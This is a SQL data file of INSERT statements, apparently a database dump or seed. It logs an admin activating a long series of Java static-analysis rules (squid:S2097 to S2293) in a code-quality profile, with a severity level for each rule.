INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1019, '2017-11-20 07:41:42.45', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCyybbGRdfPp-qte');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1020, '2017-11-20 07:41:42.491', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCzbbbGRdfPp-qtf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1021, '2017-11-20 07:41:42.529', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC0BbbGRdfPp-qtg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1022, '2017-11-20 07:41:42.557', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC0dbbGRdfPp-qth');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1023, '2017-11-20 07:41:42.596', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC1EbbGRdfPp-qti');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1024, '2017-11-20 07:41:42.634', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC1pbbGRdfPp-qtj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1025, '2017-11-20 07:41:42.677', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC2UbbGRdfPp-qtk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1026, '2017-11-20 07:41:42.716', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC28bbGRdfPp-qtl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1027, '2017-11-20 07:41:42.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC3gbbGRdfPp-qtm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1028, '2017-11-20 07:41:42.781', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC39bbGRdfPp-qtn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1029, '2017-11-20 07:41:42.852', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC5DbbGRdfPp-qto');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1030, '2017-11-20 07:41:42.947', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC6jbbGRdfPp-qtp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1031, '2017-11-20 07:41:43.047', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC8HbbGRdfPp-qtq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1032, '2017-11-20 07:41:43.092', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC80bbGRdfPp-qtr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1033, '2017-11-20 07:41:43.127', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC9XbbGRdfPp-qts');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1034, '2017-11-20 07:41:43.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC-AbbGRdfPp-qtt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1035, '2017-11-20 07:41:43.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC-kbbGRdfPp-qtu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1036, '2017-11-20 07:41:43.244', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC_MbbGRdfPp-qtv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1037, '2017-11-20 07:41:43.273', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYC_pbbGRdfPp-qtw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1038, '2017-11-20 07:41:43.319', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDAXbbGRdfPp-qtx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1039, '2017-11-20 07:41:43.358', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDA-bbGRdfPp-qty');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1040, '2017-11-20 07:41:43.398', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDBmbbGRdfPp-qtz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1041, '2017-11-20 07:41:43.434', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDCKbbGRdfPp-qt0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1042, '2017-11-20 07:41:43.472', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDCwbbGRdfPp-qt1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1043, '2017-11-20 07:41:43.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDDEbbGRdfPp-qt2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1044, '2017-11-20 07:41:43.542', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDD2bbGRdfPp-qt3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1045, '2017-11-20 07:41:43.583', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDEfbbGRdfPp-qt4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1046, '2017-11-20 07:41:43.607', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDE3bbGRdfPp-qt5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1047, '2017-11-20 07:41:43.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDFabbGRdfPp-qt6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1048, '2017-11-20 07:41:43.711', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDGfbbGRdfPp-qt7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1049, '2017-11-20 07:41:43.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDHFbbGRdfPp-qt8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1050, '2017-11-20 07:41:43.798', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDH2bbGRdfPp-qt9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1051, '2017-11-20 07:41:43.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDI6bbGRdfPp-qt-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1052, '2017-11-20 07:41:43.936', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDKAbbGRdfPp-qt_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1053, '2017-11-20 07:41:43.999', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDK_bbGRdfPp-quA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1054, '2017-11-20 07:41:44.108', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDMsbbGRdfPp-quB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1055, '2017-11-20 07:41:44.195', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDODbbGRdfPp-quC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1056, '2017-11-20 07:41:44.233', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDOpbbGRdfPp-quD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1057, '2017-11-20 07:41:44.272', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDPQbbGRdfPp-quE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1058, '2017-11-20 07:41:44.319', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDP_bbGRdfPp-quF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1059, '2017-11-20 07:41:44.364', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDQsbbGRdfPp-quG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1060, '2017-11-20 07:41:44.408', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDRYbbGRdfPp-quH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1061, '2017-11-20 07:41:44.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDSQbbGRdfPp-quI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1062, '2017-11-20 07:41:44.504', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDS4bbGRdfPp-quJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1063, '2017-11-20 07:41:44.543', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDTfbbGRdfPp-quK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1064, '2017-11-20 07:41:44.583', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDUHbbGRdfPp-quL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1065, '2017-11-20 07:41:44.62', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDUsbbGRdfPp-quM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1066, '2017-11-20 07:41:44.663', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDVXbbGRdfPp-quN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1067, '2017-11-20 07:41:44.7', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDV8bbGRdfPp-quO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1068, '2017-11-20 07:41:44.737', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDWhbbGRdfPp-quP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1069, '2017-11-20 07:41:44.773', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDXFbbGRdfPp-quQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1070, '2017-11-20 07:41:44.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDX0bbGRdfPp-quR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1071, '2017-11-20 07:41:44.855', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDYXbbGRdfPp-quS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1072, '2017-11-20 07:41:44.893', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDY9bbGRdfPp-quT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1073, '2017-11-20 07:41:44.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDZnbbGRdfPp-quU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1074, '2017-11-20 07:41:44.973', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDaNbbGRdfPp-quV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1075, '2017-11-20 07:41:45.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDaxbbGRdfPp-quW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1076, '2017-11-20 07:41:45.035', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDbLbbGRdfPp-quX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1077, '2017-11-20 07:41:45.078', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDb2bbGRdfPp-quY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1078, '2017-11-20 07:41:45.126', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDcmbbGRdfPp-quZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1079, '2017-11-20 07:41:45.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDdPbbGRdfPp-qua');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1080, '2017-11-20 07:41:45.208', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDd4bbGRdfPp-qub');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1081, '2017-11-20 07:41:45.24', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDeYbbGRdfPp-quc');
